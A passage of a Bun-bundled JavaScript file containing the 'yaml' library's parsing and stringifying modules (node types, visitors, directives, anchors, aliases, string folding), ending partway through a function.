// @bun
var __create = Object.create;
var __getProtoOf = Object.getPrototypeOf;
var __defProp = Object.defineProperty;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __toESM = (mod, isNodeMode, target) => {
  target = mod != null ? __create(__getProtoOf(mod)) : {};
  const to = isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target;
  for (let key of __getOwnPropNames(mod))
    if (!__hasOwnProp.call(to, key))
      __defProp(to, key, {
        get: () => mod[key],
        enumerable: true
      });
  return to;
};
var __commonJS = (cb, mod) => () => (mod || cb((mod = { exports: {} }).exports, mod), mod.exports);
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, {
      get: all[name],
      enumerable: true,
      configurable: true,
      set: (newValue) => all[name] = () => newValue
    });
};
var __esm = (fn, res) => () => (fn && (res = fn(fn = 0)), res);
var __require = import.meta.require;

// node_modules/yaml/dist/nodes/identity.js
var require_identity = __commonJS((exports) => {
  var ALIAS = Symbol.for("yaml.alias");
  var DOC = Symbol.for("yaml.document");
  var MAP = Symbol.for("yaml.map");
  var PAIR = Symbol.for("yaml.pair");
  var SCALAR = Symbol.for("yaml.scalar");
  var SEQ = Symbol.for("yaml.seq");
  var NODE_TYPE = Symbol.for("yaml.node.type");
  var isAlias = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === ALIAS;
  var isDocument = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === DOC;
  var isMap = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === MAP;
  var isPair = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === PAIR;
  var isScalar = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SCALAR;
  var isSeq = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SEQ;
  function isCollection(node) {
    if (node && typeof node === "object")
      switch (node[NODE_TYPE]) {
        case MAP:
        case SEQ:
          return true;
      }
    return false;
  }
  function isNode(node) {
    if (node && typeof node === "object")
      switch (node[NODE_TYPE]) {
        case ALIAS:
        case MAP:
        case SCALAR:
        case SEQ:
          return true;
      }
    return false;
  }
  var hasAnchor = (node) => (isScalar(node) || isCollection(node)) && !!node.anchor;
  exports.ALIAS = ALIAS;
  exports.DOC = DOC;
  exports.MAP = MAP;
  exports.NODE_TYPE = NODE_TYPE;
  exports.PAIR = PAIR;
  exports.SCALAR = SCALAR;
  exports.SEQ = SEQ;
  exports.hasAnchor = hasAnchor;
  exports.isAlias = isAlias;
  exports.isCollection = isCollection;
  exports.isDocument = isDocument;
  exports.isMap = isMap;
  exports.isNode = isNode;
  exports.isPair = isPair;
  exports.isScalar = isScalar;
  exports.isSeq = isSeq;
});

// node_modules/yaml/dist/visit.js
var require_visit = __commonJS((exports) => {
  var identity = require_identity();
  var BREAK = Symbol("break visit");
  var SKIP = Symbol("skip children");
  var REMOVE = Symbol("remove node");
  function visit(node, visitor) {
    const visitor_ = initVisitor(visitor);
    if (identity.isDocument(node)) {
      const cd = visit_(null, node.contents, visitor_, Object.freeze([node]));
      if (cd === REMOVE)
        node.contents = null;
    } else
      visit_(null, node, visitor_, Object.freeze([]));
  }
  visit.BREAK = BREAK;
  visit.SKIP = SKIP;
  visit.REMOVE = REMOVE;
  function visit_(key, node, visitor, path) {
    const ctrl = callVisitor(key, node, visitor, path);
    if (identity.isNode(ctrl) || identity.isPair(ctrl)) {
      replaceNode(key, path, ctrl);
      return visit_(key, ctrl, visitor, path);
    }
    if (typeof ctrl !== "symbol") {
      if (identity.isCollection(node)) {
        path = Object.freeze(path.concat(node));
        for (let i = 0;i < node.items.length; ++i) {
          const ci = visit_(i, node.items[i], visitor, path);
          if (typeof ci === "number")
            i = ci - 1;
          else if (ci === BREAK)
            return BREAK;
          else if (ci === REMOVE) {
            node.items.splice(i, 1);
            i -= 1;
          }
        }
      } else if (identity.isPair(node)) {
        path = Object.freeze(path.concat(node));
        const ck = visit_("key", node.key, visitor, path);
        if (ck === BREAK)
          return BREAK;
        else if (ck === REMOVE)
          node.key = null;
        const cv = visit_("value", node.value, visitor, path);
        if (cv === BREAK)
          return BREAK;
        else if (cv === REMOVE)
          node.value = null;
      }
    }
    return ctrl;
  }
  async function visitAsync(node, visitor) {
    const visitor_ = initVisitor(visitor);
    if (identity.isDocument(node)) {
      const cd = await visitAsync_(null, node.contents, visitor_, Object.freeze([node]));
      if (cd === REMOVE)
        node.contents = null;
    } else
      await visitAsync_(null, node, visitor_, Object.freeze([]));
  }
  visitAsync.BREAK = BREAK;
  visitAsync.SKIP = SKIP;
  visitAsync.REMOVE = REMOVE;
  async function visitAsync_(key, node, visitor, path) {
    const ctrl = await callVisitor(key, node, visitor, path);
    if (identity.isNode(ctrl) || identity.isPair(ctrl)) {
      replaceNode(key, path, ctrl);
      return visitAsync_(key, ctrl, visitor, path);
    }
    if (typeof ctrl !== "symbol") {
      if (identity.isCollection(node)) {
        path = Object.freeze(path.concat(node));
        for (let i = 0;i < node.items.length; ++i) {
          const ci = await visitAsync_(i, node.items[i], visitor, path);
          if (typeof ci === "number")
            i = ci - 1;
          else if (ci === BREAK)
            return BREAK;
          else if (ci === REMOVE) {
            node.items.splice(i, 1);
            i -= 1;
          }
        }
      } else if (identity.isPair(node)) {
        path = Object.freeze(path.concat(node));
        const ck = await visitAsync_("key", node.key, visitor, path);
        if (ck === BREAK)
          return BREAK;
        else if (ck === REMOVE)
          node.key = null;
        const cv = await visitAsync_("value", node.value, visitor, path);
        if (cv === BREAK)
          return BREAK;
        else if (cv === REMOVE)
          node.value = null;
      }
    }
    return ctrl;
  }
  function initVisitor(visitor) {
    if (typeof visitor === "object" && (visitor.Collection || visitor.Node || visitor.Value)) {
      return Object.assign({
        Alias: visitor.Node,
        Map: visitor.Node,
        Scalar: visitor.Node,
        Seq: visitor.Node
      }, visitor.Value && {
        Map: visitor.Value,
        Scalar: visitor.Value,
        Seq: visitor.Value
      }, visitor.Collection && {
        Map: visitor.Collection,
        Seq: visitor.Collection
      }, visitor);
    }
    return visitor;
  }
  function callVisitor(key, node, visitor, path) {
    if (typeof visitor === "function")
      return visitor(key, node, path);
    if (identity.isMap(node))
      return visitor.Map?.(key, node, path);
    if (identity.isSeq(node))
      return visitor.Seq?.(key, node, path);
    if (identity.isPair(node))
      return visitor.Pair?.(key, node, path);
    if (identity.isScalar(node))
      return visitor.Scalar?.(key, node, path);
    if (identity.isAlias(node))
      return visitor.Alias?.(key, node, path);
    return;
  }
  function replaceNode(key, path, node) {
    const parent = path[path.length - 1];
    if (identity.isCollection(parent)) {
      parent.items[key] = node;
    } else if (identity.isPair(parent)) {
      if (key === "key")
        parent.key = node;
      else
        parent.value = node;
    } else if (identity.isDocument(parent)) {
      parent.contents = node;
    } else {
      const pt = identity.isAlias(parent) ? "alias" : "scalar";
      throw new Error(`Cannot replace node with ${pt} parent`);
    }
  }
  exports.visit = visit;
  exports.visitAsync = visitAsync;
});

// node_modules/yaml/dist/doc/directives.js
var require_directives = __commonJS((exports) => {
  var identity = require_identity();
  var visit = require_visit();
  var escapeChars = {
    "!": "%21",
    ",": "%2C",
    "[": "%5B",
    "]": "%5D",
    "{": "%7B",
    "}": "%7D"
  };
  var escapeTagName = (tn) => tn.replace(/[!,[\]{}]/g, (ch) => escapeChars[ch]);

  class Directives {
    constructor(yaml, tags) {
      this.docStart = null;
      this.docEnd = false;
      this.yaml = Object.assign({}, Directives.defaultYaml, yaml);
      this.tags = Object.assign({}, Directives.defaultTags, tags);
    }
    clone() {
      const copy = new Directives(this.yaml, this.tags);
      copy.docStart = this.docStart;
      return copy;
    }
    atDocument() {
      const res = new Directives(this.yaml, this.tags);
      switch (this.yaml.version) {
        case "1.1":
          this.atNextDocument = true;
          break;
        case "1.2":
          this.atNextDocument = false;
          this.yaml = {
            explicit: Directives.defaultYaml.explicit,
            version: "1.2"
          };
          this.tags = Object.assign({}, Directives.defaultTags);
          break;
      }
      return res;
    }
    add(line, onError) {
      if (this.atNextDocument) {
        this.yaml = { explicit: Directives.defaultYaml.explicit, version: "1.1" };
        this.tags = Object.assign({}, Directives.defaultTags);
        this.atNextDocument = false;
      }
      const parts = line.trim().split(/[ \t]+/);
      const name = parts.shift();
      switch (name) {
        case "%TAG": {
          if (parts.length !== 2) {
            onError(0, "%TAG directive should contain exactly two parts");
            if (parts.length < 2)
              return false;
          }
          const [handle, prefix] = parts;
          this.tags[handle] = prefix;
          return true;
        }
        case "%YAML": {
          this.yaml.explicit = true;
          if (parts.length !== 1) {
            onError(0, "%YAML directive should contain exactly one part");
            return false;
          }
          const [version2] = parts;
          if (version2 === "1.1" || version2 === "1.2") {
            this.yaml.version = version2;
            return true;
          } else {
            const isValid = /^\d+\.\d+$/.test(version2);
            onError(6, `Unsupported YAML version ${version2}`, isValid);
            return false;
          }
        }
        default:
          onError(0, `Unknown directive ${name}`, true);
          return false;
      }
    }
    tagName(source, onError) {
      if (source === "!")
        return "!";
      if (source[0] !== "!") {
        onError(`Not a valid tag: ${source}`);
        return null;
      }
      if (source[1] === "<") {
        const verbatim = source.slice(2, -1);
        if (verbatim === "!" || verbatim === "!!") {
          onError(`Verbatim tags aren't resolved, so ${source} is invalid.`);
          return null;
        }
        if (source[source.length - 1] !== ">")
          onError("Verbatim tags must end with a >");
        return verbatim;
      }
      const [, handle, suffix] = source.match(/^(.*!)([^!]*)$/s);
      if (!suffix)
        onError(`The ${source} tag has no suffix`);
      const prefix = this.tags[handle];
      if (prefix) {
        try {
          return prefix + decodeURIComponent(suffix);
        } catch (error48) {
          onError(String(error48));
          return null;
        }
      }
      if (handle === "!")
        return source;
      onError(`Could not resolve tag: ${source}`);
      return null;
    }
    tagString(tag) {
      for (const [handle, prefix] of Object.entries(this.tags)) {
        if (tag.startsWith(prefix))
          return handle + escapeTagName(tag.substring(prefix.length));
      }
      return tag[0] === "!" ? tag : `!<${tag}>`;
    }
    toString(doc2) {
      const lines = this.yaml.explicit ? [`%YAML ${this.yaml.version || "1.2"}`] : [];
      const tagEntries = Object.entries(this.tags);
      let tagNames;
      if (doc2 && tagEntries.length > 0 && identity.isNode(doc2.contents)) {
        const tags = {};
        visit.visit(doc2.contents, (_key, node) => {
          if (identity.isNode(node) && node.tag)
            tags[node.tag] = true;
        });
        tagNames = Object.keys(tags);
      } else
        tagNames = [];
      for (const [handle, prefix] of tagEntries) {
        if (handle === "!!" && prefix === "tag:yaml.org,2002:")
          continue;
        if (!doc2 || tagNames.some((tn) => tn.startsWith(prefix)))
          lines.push(`%TAG ${handle} ${prefix}`);
      }
      return lines.join(`
`);
    }
  }
  Directives.defaultYaml = { explicit: false, version: "1.2" };
  Directives.defaultTags = { "!!": "tag:yaml.org,2002:" };
  exports.Directives = Directives;
});

// node_modules/yaml/dist/doc/anchors.js
var require_anchors = __commonJS((exports) => {
  var identity = require_identity();
  var visit = require_visit();
  function anchorIsValid(anchor) {
    if (/[\x00-\x19\s,[\]{}]/.test(anchor)) {
      const sa = JSON.stringify(anchor);
      const msg = `Anchor must not contain whitespace or control characters: ${sa}`;
      throw new Error(msg);
    }
    return true;
  }
  function anchorNames(root) {
    const anchors = new Set;
    visit.visit(root, {
      Value(_key, node) {
        if (node.anchor)
          anchors.add(node.anchor);
      }
    });
    return anchors;
  }
  function findNewAnchor(prefix, exclude) {
    for (let i = 1;; ++i) {
      const name = `${prefix}${i}`;
      if (!exclude.has(name))
        return name;
    }
  }
  function createNodeAnchors(doc2, prefix) {
    const aliasObjects = [];
    const sourceObjects = new Map;
    let prevAnchors = null;
    return {
      onAnchor: (source) => {
        aliasObjects.push(source);
        prevAnchors ?? (prevAnchors = anchorNames(doc2));
        const anchor = findNewAnchor(prefix, prevAnchors);
        prevAnchors.add(anchor);
        return anchor;
      },
      setAnchors: () => {
        for (const source of aliasObjects) {
          const ref = sourceObjects.get(source);
          if (typeof ref === "object" && ref.anchor && (identity.isScalar(ref.node) || identity.isCollection(ref.node))) {
            ref.node.anchor = ref.anchor;
          } else {
            const error48 = new Error("Failed to resolve repeated object (this should not happen)");
            error48.source = source;
            throw error48;
          }
        }
      },
      sourceObjects
    };
  }
  exports.anchorIsValid = anchorIsValid;
  exports.anchorNames = anchorNames;
  exports.createNodeAnchors = createNodeAnchors;
  exports.findNewAnchor = findNewAnchor;
});

// node_modules/yaml/dist/doc/applyReviver.js
var require_applyReviver = __commonJS((exports) => {
  function applyReviver(reviver, obj, key, val) {
    if (val && typeof val === "object") {
      if (Array.isArray(val)) {
        for (let i = 0, len = val.length;i < len; ++i) {
          const v0 = val[i];
          const v1 = applyReviver(reviver, val, String(i), v0);
          if (v1 === undefined)
            delete val[i];
          else if (v1 !== v0)
            val[i] = v1;
        }
      } else if (val instanceof Map) {
        for (const k of Array.from(val.keys())) {
          const v0 = val.get(k);
          const v1 = applyReviver(reviver, val, k, v0);
          if (v1 === undefined)
            val.delete(k);
          else if (v1 !== v0)
            val.set(k, v1);
        }
      } else if (val instanceof Set) {
        for (const v0 of Array.from(val)) {
          const v1 = applyReviver(reviver, val, v0, v0);
          if (v1 === undefined)
            val.delete(v0);
          else if (v1 !== v0) {
            val.delete(v0);
            val.add(v1);
          }
        }
      } else {
        for (const [k, v0] of Object.entries(val)) {
          const v1 = applyReviver(reviver, val, k, v0);
          if (v1 === undefined)
            delete val[k];
          else if (v1 !== v0)
            val[k] = v1;
        }
      }
    }
    return reviver.call(obj, key, val);
  }
  exports.applyReviver = applyReviver;
});

// node_modules/yaml/dist/nodes/toJS.js
var require_toJS = __commonJS((exports) => {
  var identity = require_identity();
  function toJS(value, arg, ctx) {
    if (Array.isArray(value))
      return value.map((v, i) => toJS(v, String(i), ctx));
    if (value && typeof value.toJSON === "function") {
      if (!ctx || !identity.hasAnchor(value))
        return value.toJSON(arg, ctx);
      const data = { aliasCount: 0, count: 1, res: undefined };
      ctx.anchors.set(value, data);
      ctx.onCreate = (res2) => {
        data.res = res2;
        delete ctx.onCreate;
      };
      const res = value.toJSON(arg, ctx);
      if (ctx.onCreate)
        ctx.onCreate(res);
      return res;
    }
    if (typeof value === "bigint" && !ctx?.keep)
      return Number(value);
    return value;
  }
  exports.toJS = toJS;
});

// node_modules/yaml/dist/nodes/Node.js
var require_Node = __commonJS((exports) => {
  var applyReviver = require_applyReviver();
  var identity = require_identity();
  var toJS = require_toJS();

  class NodeBase {
    constructor(type) {
      Object.defineProperty(this, identity.NODE_TYPE, { value: type });
    }
    clone() {
      const copy = Object.create(Object.getPrototypeOf(this), Object.getOwnPropertyDescriptors(this));
      if (this.range)
        copy.range = this.range.slice();
      return copy;
    }
    toJS(doc2, { mapAsMap, maxAliasCount, onAnchor, reviver } = {}) {
      if (!identity.isDocument(doc2))
        throw new TypeError("A document argument is required");
      const ctx = {
        anchors: new Map,
        doc: doc2,
        keep: true,
        mapAsMap: mapAsMap === true,
        mapKeyWarned: false,
        maxAliasCount: typeof maxAliasCount === "number" ? maxAliasCount : 100
      };
      const res = toJS.toJS(this, "", ctx);
      if (typeof onAnchor === "function")
        for (const { count, res: res2 } of ctx.anchors.values())
          onAnchor(res2, count);
      return typeof reviver === "function" ? applyReviver.applyReviver(reviver, { "": res }, "", res) : res;
    }
  }
  exports.NodeBase = NodeBase;
});

// node_modules/yaml/dist/nodes/Alias.js
var require_Alias = __commonJS((exports) => {
  var anchors = require_anchors();
  var visit = require_visit();
  var identity = require_identity();
  var Node = require_Node();
  var toJS = require_toJS();

  class Alias extends Node.NodeBase {
    constructor(source) {
      super(identity.ALIAS);
      this.source = source;
      Object.defineProperty(this, "tag", {
        set() {
          throw new Error("Alias nodes cannot have tags");
        }
      });
    }
    resolve(doc2, ctx) {
      let nodes;
      if (ctx?.aliasResolveCache) {
        nodes = ctx.aliasResolveCache;
      } else {
        nodes = [];
        visit.visit(doc2, {
          Node: (_key, node) => {
            if (identity.isAlias(node) || identity.hasAnchor(node))
              nodes.push(node);
          }
        });
        if (ctx)
          ctx.aliasResolveCache = nodes;
      }
      let found = undefined;
      for (const node of nodes) {
        if (node === this)
          break;
        if (node.anchor === this.source)
          found = node;
      }
      return found;
    }
    toJSON(_arg, ctx) {
      if (!ctx)
        return { source: this.source };
      const { anchors: anchors2, doc: doc2, maxAliasCount } = ctx;
      const source = this.resolve(doc2, ctx);
      if (!source) {
        const msg = `Unresolved alias (the anchor must be set before the alias): ${this.source}`;
        throw new ReferenceError(msg);
      }
      let data = anchors2.get(source);
      if (!data) {
        toJS.toJS(source, null, ctx);
        data = anchors2.get(source);
      }
      if (data?.res === undefined) {
        const msg = "This should not happen: Alias anchor was not resolved?";
        throw new ReferenceError(msg);
      }
      if (maxAliasCount >= 0) {
        data.count += 1;
        if (data.aliasCount === 0)
          data.aliasCount = getAliasCount(doc2, source, anchors2);
        if (data.count * data.aliasCount > maxAliasCount) {
          const msg = "Excessive alias count indicates a resource exhaustion attack";
          throw new ReferenceError(msg);
        }
      }
      return data.res;
    }
    toString(ctx, _onComment, _onChompKeep) {
      const src = `*${this.source}`;
      if (ctx) {
        anchors.anchorIsValid(this.source);
        if (ctx.options.verifyAliasOrder && !ctx.anchors.has(this.source)) {
          const msg = `Unresolved alias (the anchor must be set before the alias): ${this.source}`;
          throw new Error(msg);
        }
        if (ctx.implicitKey)
          return `${src} `;
      }
      return src;
    }
  }
  function getAliasCount(doc2, node, anchors2) {
    if (identity.isAlias(node)) {
      const source = node.resolve(doc2);
      const anchor = anchors2 && source && anchors2.get(source);
      return anchor ? anchor.count * anchor.aliasCount : 0;
    } else if (identity.isCollection(node)) {
      let count = 0;
      for (const item of node.items) {
        const c = getAliasCount(doc2, item, anchors2);
        if (c > count)
          count = c;
      }
      return count;
    } else if (identity.isPair(node)) {
      const kc = getAliasCount(doc2, node.key, anchors2);
      const vc = getAliasCount(doc2, node.value, anchors2);
      return Math.max(kc, vc);
    }
    return 1;
  }
  exports.Alias = Alias;
});

// node_modules/yaml/dist/nodes/Scalar.js
var require_Scalar = __commonJS((exports) => {
  var identity = require_identity();
  var Node = require_Node();
  var toJS = require_toJS();
  var isScalarValue = (value) => !value || typeof value !== "function" && typeof value !== "object";

  class Scalar extends Node.NodeBase {
    constructor(value) {
      super(identity.SCALAR);
      this.value = value;
    }
    toJSON(arg, ctx) {
      return ctx?.keep ? this.value : toJS.toJS(this.value, arg, ctx);
    }
    toString() {
      return String(this.value);
    }
  }
  Scalar.BLOCK_FOLDED = "BLOCK_FOLDED";
  Scalar.BLOCK_LITERAL = "BLOCK_LITERAL";
  Scalar.PLAIN = "PLAIN";
  Scalar.QUOTE_DOUBLE = "QUOTE_DOUBLE";
  Scalar.QUOTE_SINGLE = "QUOTE_SINGLE";
  exports.Scalar = Scalar;
  exports.isScalarValue = isScalarValue;
});

// node_modules/yaml/dist/doc/createNode.js
var require_createNode = __commonJS((exports) => {
  var Alias = require_Alias();
  var identity = require_identity();
  var Scalar = require_Scalar();
  var defaultTagPrefix = "tag:yaml.org,2002:";
  function findTagObject(value, tagName, tags) {
    if (tagName) {
      const match = tags.filter((t) => t.tag === tagName);
      const tagObj = match.find((t) => !t.format) ?? match[0];
      if (!tagObj)
        throw new Error(`Tag ${tagName} not found`);
      return tagObj;
    }
    return tags.find((t) => t.identify?.(value) && !t.format);
  }
  function createNode(value, tagName, ctx) {
    if (identity.isDocument(value))
      value = value.contents;
    if (identity.isNode(value))
      return value;
    if (identity.isPair(value)) {
      const map2 = ctx.schema[identity.MAP].createNode?.(ctx.schema, null, ctx);
      map2.items.push(value);
      return map2;
    }
    if (value instanceof String || value instanceof Number || value instanceof Boolean || typeof BigInt !== "undefined" && value instanceof BigInt) {
      value = value.valueOf();
    }
    const { aliasDuplicateObjects, onAnchor, onTagObj, schema, sourceObjects } = ctx;
    let ref = undefined;
    if (aliasDuplicateObjects && value && typeof value === "object") {
      ref = sourceObjects.get(value);
      if (ref) {
        ref.anchor ?? (ref.anchor = onAnchor(value));
        return new Alias.Alias(ref.anchor);
      } else {
        ref = { anchor: null, node: null };
        sourceObjects.set(value, ref);
      }
    }
    if (tagName?.startsWith("!!"))
      tagName = defaultTagPrefix + tagName.slice(2);
    let tagObj = findTagObject(value, tagName, schema.tags);
    if (!tagObj) {
      if (value && typeof value.toJSON === "function") {
        value = value.toJSON();
      }
      if (!value || typeof value !== "object") {
        const node2 = new Scalar.Scalar(value);
        if (ref)
          ref.node = node2;
        return node2;
      }
      tagObj = value instanceof Map ? schema[identity.MAP] : (Symbol.iterator in Object(value)) ? schema[identity.SEQ] : schema[identity.MAP];
    }
    if (onTagObj) {
      onTagObj(tagObj);
      delete ctx.onTagObj;
    }
    const node = tagObj?.createNode ? tagObj.createNode(ctx.schema, value, ctx) : typeof tagObj?.nodeClass?.from === "function" ? tagObj.nodeClass.from(ctx.schema, value, ctx) : new Scalar.Scalar(value);
    if (tagName)
      node.tag = tagName;
    else if (!tagObj.default)
      node.tag = tagObj.tag;
    if (ref)
      ref.node = node;
    return node;
  }
  exports.createNode = createNode;
});

// node_modules/yaml/dist/nodes/Collection.js
var require_Collection = __commonJS((exports) => {
  var createNode = require_createNode();
  var identity = require_identity();
  var Node = require_Node();
  function collectionFromPath(schema, path, value) {
    let v = value;
    for (let i = path.length - 1;i >= 0; --i) {
      const k = path[i];
      if (typeof k === "number" && Number.isInteger(k) && k >= 0) {
        const a = [];
        a[k] = v;
        v = a;
      } else {
        v = new Map([[k, v]]);
      }
    }
    return createNode.createNode(v, undefined, {
      aliasDuplicateObjects: false,
      keepUndefined: false,
      onAnchor: () => {
        throw new Error("This should not happen, please report a bug.");
      },
      schema,
      sourceObjects: new Map
    });
  }
  var isEmptyPath = (path) => path == null || typeof path === "object" && !!path[Symbol.iterator]().next().done;

  class Collection extends Node.NodeBase {
    constructor(type, schema) {
      super(type);
      Object.defineProperty(this, "schema", {
        value: schema,
        configurable: true,
        enumerable: false,
        writable: true
      });
    }
    clone(schema) {
      const copy = Object.create(Object.getPrototypeOf(this), Object.getOwnPropertyDescriptors(this));
      if (schema)
        copy.schema = schema;
      copy.items = copy.items.map((it) => identity.isNode(it) || identity.isPair(it) ? it.clone(schema) : it);
      if (this.range)
        copy.range = this.range.slice();
      return copy;
    }
    addIn(path, value) {
      if (isEmptyPath(path))
        this.add(value);
      else {
        const [key, ...rest] = path;
        const node = this.get(key, true);
        if (identity.isCollection(node))
          node.addIn(rest, value);
        else if (node === undefined && this.schema)
          this.set(key, collectionFromPath(this.schema, rest, value));
        else
          throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);
      }
    }
    deleteIn(path) {
      const [key, ...rest] = path;
      if (rest.length === 0)
        return this.delete(key);
      const node = this.get(key, true);
      if (identity.isCollection(node))
        return node.deleteIn(rest);
      else
        throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);
    }
    getIn(path, keepScalar) {
      const [key, ...rest] = path;
      const node = this.get(key, true);
      if (rest.length === 0)
        return !keepScalar && identity.isScalar(node) ? node.value : node;
      else
        return identity.isCollection(node) ? node.getIn(rest, keepScalar) : undefined;
    }
    hasAllNullValues(allowScalar) {
      return this.items.every((node) => {
        if (!identity.isPair(node))
          return false;
        const n = node.value;
        return n == null || allowScalar && identity.isScalar(n) && n.value == null && !n.commentBefore && !n.comment && !n.tag;
      });
    }
    hasIn(path) {
      const [key, ...rest] = path;
      if (rest.length === 0)
        return this.has(key);
      const node = this.get(key, true);
      return identity.isCollection(node) ? node.hasIn(rest) : false;
    }
    setIn(path, value) {
      const [key, ...rest] = path;
      if (rest.length === 0) {
        this.set(key, value);
      } else {
        const node = this.get(key, true);
        if (identity.isCollection(node))
          node.setIn(rest, value);
        else if (node === undefined && this.schema)
          this.set(key, collectionFromPath(this.schema, rest, value));
        else
          throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);
      }
    }
  }
  exports.Collection = Collection;
  exports.collectionFromPath = collectionFromPath;
  exports.isEmptyPath = isEmptyPath;
});

// node_modules/yaml/dist/stringify/stringifyComment.js
var require_stringifyComment = __commonJS((exports) => {
  var stringifyComment = (str) => str.replace(/^(?!$)(?: $)?/gm, "#");
  function indentComment(comment, indent) {
    if (/^\n+$/.test(comment))
      return comment.substring(1);
    return indent ? comment.replace(/^(?! *$)/gm, indent) : comment;
  }
  var lineComment = (str, indent, comment) => str.endsWith(`
`) ? indentComment(comment, indent) : comment.includes(`
`) ? `
` + indentComment(comment, indent) : (str.endsWith(" ") ? "" : " ") + comment;
  exports.indentComment = indentComment;
  exports.lineComment = lineComment;
  exports.stringifyComment = stringifyComment;
});

// node_modules/yaml/dist/stringify/foldFlowLines.js
var require_foldFlowLines = __commonJS((exports) => {
  var FOLD_FLOW = "flow";
  var FOLD_BLOCK = "block";
  var FOLD_QUOTED = "quoted";
  function foldFlowLines(text, indent, mode = "flow", { indentAtStart, lineWidth = 80, minContentWidth = 20, onFold, onOverflow } = {}) {
    if (!lineWidth || lineWidth < 0)
      return text;
    if (lineWidth < minContentWidth)
      minContentWidth = 0;
    const endStep = Math.max(1 + minContentWidth, 1 + lineWidth - indent.length);
    if (text.length <= endStep)
      return text;
    const folds = [];
    const escapedFolds = {};
    let end = lineWidth - indent.length;
    if (typeof indentAtStart === "number") {
      if (indentAtStart > lineWidth - Math.max(2, minContentWidth))
        folds.push(0);
      else
        end = lineWidth - indentAtStart;
    }
    let split = undefined;
    let prev = undefined;
    let overflow = false;
    let i = -1;
    let escStart = -1;
    let escEnd = -1;
    if (mode === FOLD_BLOCK) {
      i = consumeMoreIndentedLines(text, i, indent.length);
      if (i !== -1)
        end = i + endStep;
    }
    for (let ch;ch = text[i += 1]; ) {
      if (mode === FOLD_QUOTED && ch === "\\") {
        escStart = i;
        switch (text[i + 1]) {
          case "x":
            i += 3;
            break;
          case "u":
            i += 5;
            break;
          case "U":
            i += 9;
            break;
          default:
            i += 1;
        }
        escEnd = i;
      }
      if (ch === `
`) {
        if (mode === FOLD_BLOCK)
          i = consumeMoreIndentedLines(text, i, indent.length);
        end = i + indent.length + endStep;
        split = undefined;
      } else {
        if (ch === " " && prev && prev !== " " && prev !== `
` && prev !== "\t") {
          const next = text[i + 1];
          if (next && next !== " " && next !== `
` && next !== "\t")
            split = i;
        }
        if (i >= end) {
          if (split) {
            folds.push(split);
            end = split + endStep;
            split = undefined;
          } else if (mode === FOLD_QUOTED) {
            while (prev === " " || prev === "\t") {
              prev = ch;
              ch = text[i += 1];
              overflow = true;
            }
            const j = i > escEnd + 1 ? i - 2 : escStart - 1;
            if (escapedFolds[j])
              return text;
            folds.push(j);
            escapedFolds[j] = true;
            end = j + endStep;
            split = undefined;
          } else {
            overflow = true;
          }
        }
      }
      prev = ch;
    }
    if (overflow && onOverflow)
      onOverflow();
    if (folds.length === 0)
      return text;
    if (onFold)
      onFold();
    let res = text.slice(0, folds[0]);
    for (let i2 = 0;i2 < folds.length; ++i2) {
      const fold = folds[i2];
      const end2 = folds[i2 + 1] || text.length;
      if (fold === 0)
        res = `
${indent}${text.slice(0, end2)}`;
      else {
        if (mode === FOLD_QUOTED && escapedFolds[fold])
          res += `${text[fold]}\\`;
        res += `
${indent}${text.slice(fold + 1, end2)}`;
      }
    }
    return res;
  }
  function consumeMoreIndentedLines(text, i, indent) {
    let end = i;
    let start = i + 1;
    let ch = text[start];
    while (ch === " " || ch === "\t") {
      if (i < start + indent) {
        ch = text[++i];
      } else {
        do {
          ch = text[++i];
        } while (ch && ch !== `
`);
        end = i;
        start = i + 1;
        ch = text[start];
      }
    }
    return end;
  }
  exports.FOLD_BLOCK = FOLD_BLOCK;
  exports.FOLD_FLOW = FOLD_FLOW;
  exports.FOLD_QUOTED = FOLD_QUOTED;
  exports.foldFlowLines = foldFlowLines;
});

// node_modules/yaml/dist/stringify/stringifyString.js
var require_stringifyString = __commonJS((exports) => {
  var Scalar = require_Scalar();
  var foldFlowLines = require_foldFlowLines();
  var getFoldOptions = (ctx, isBlock) => ({
    indentAtStart: isBlock ? ctx.indent.length : ctx.indentAtStart,
    lineWidth: ctx.options.lineWidth,
    minContentWidth: ctx.options.minContentWidth
  });
  var containsDocumentMarker = (str) => /^(%|---|\.\.\.)/m.test(str);
  function lineLengthOverLimit(str, lineWidth, indentLength) {
    if (!lineWidth || lineWidth < 0)
      return false;
    const limit = lineWidth - indentLength;
    const strLen = str.length;
    if (strLen <= limit)
      return false;
    for (let i = 0, start = 0;i < strLen; ++i) {
      if (str[i] === `
`) {
        if (i - start > limit)
          return true;
        start = i + 1;
        if (strLen - start <= limit)
          return false;
      }
    }
    return true;
  }
  function doubleQuotedString(value, ctx) {
    const json2 = JSON.stringify(value);
    if (ctx.options.doubleQuotedAsJSON)
      return json2;
    const { implicitKey } = ctx;
    const minMultiLineLength = ctx.options.doubleQuotedMinMultiLineLength;
    const indent = ctx.indent || (containsDocumentMarker(value) ? "  " : "");
    let str = "";
    let start = 0;
    for (let i = 0, ch = json2[i];ch; ch = json2[++i]) {
      if (ch === " " && json2[i + 1] === "\\" && json2[i + 2] === "n") {
        str += json2.slice(start, i) + "\\ ";
        i += 1;
        start = i;
        ch = "\\";
      }
      if (ch === "\\")
        switch (json2[i + 1]) {
          case "u":
            {
              str += json2.slice(start, i);
              const code = json2.substr(i + 2, 4);
              switch (code) {
                case "0000":
                  str += "\\0";
                  break;
                case "0007":
                  str += "\\a";
                  break;
                case "000b":
                  str += "\\v";
                  break;
                case "001b":
                  str += "\\e";
                  break;
                case "0085":
                  str += "\\N";
                  break;
                case "00a0":
                  str += "\\_";
                  break;
                case "2028":
                  str += "\\L";
                  break;
                case "2029":
                  str += "\\P";
                  break;
                default:
                  if (code.substr(0, 2) === "00")
                    str += "\\x" + code.substr(2);
                  else
                    str += json2.substr(i, 6);
              }
              i += 5;
              start = i + 1;
            }
            break;
          case "n":
